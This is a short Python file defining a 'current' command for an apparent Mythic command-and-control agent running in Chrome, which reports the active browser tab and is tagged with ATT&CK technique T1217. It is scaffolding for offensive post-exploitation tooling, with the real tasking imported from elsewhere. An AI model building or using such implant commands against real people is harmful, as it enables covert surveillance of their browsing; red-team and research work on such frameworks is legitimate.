from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class CurrentArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class CurrentCommand(CommandBase):
    cmd = "current"
    needs_admin = False
    help_cmd = "current"
    description = "Show the active tab"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1217"]
    argument_class = CurrentArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return wired_tasking(taskData)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
